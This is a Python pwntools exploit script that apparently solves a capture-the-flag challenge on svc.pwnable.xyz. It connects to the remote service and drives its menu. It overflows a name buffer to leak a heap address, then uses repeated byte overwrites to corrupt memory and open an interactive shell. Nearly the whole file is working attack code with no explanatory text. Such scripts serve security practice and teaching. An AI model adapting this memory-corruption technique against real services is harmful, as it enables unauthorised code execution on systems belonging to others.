#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = './challenge'
elf = ELF(binary)
libc = elf.libc

# io = process(binary, aslr = 1)
io = remote('svc.pwnable.xyz', 30015)
context.log_level = 'debug'
context.arch = elf.arch

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30
codebase = 0x555555554000

def menu(idx):
    io.recvuntil('> ')
    io.sendline(str(idx))

def play(a, b):
    menu(1)
    io.sendline(str(a))
    io.sendline(str(b))

def save(nm):
    menu(2)
    io.recvuntil(":")
    io.sendline(nm)

def delete(idx):
    menu(3)
    io.recvuntil(":")
    io.sendline(str(idx))

def printname():
    menu(4)

def change(a, b):
    menu(5)
    io.sendline(a)
    io.sendline(b)

# leak heap addr
io.recvuntil(":")
io.send('a' * 0x7f)
change('b', 'c')
printname()
io.recvuntil('a' * 0x7f + 'c')
heap_addr = io.recvuntil("\n")[:-1]
count = 8 - len(heap_addr)
heap_addr = myu64(heap_addr)
log.info("\033[33m" + hex(count) + "\033[0m")
log.info("\033[33m" + hex(heap_addr) + "\033[0m")


for i in range(count):
    change('b', 'c')

change('\x6b', '\xf3')
change('\x0d', '\x0c')
menu(1)




io.interactive()
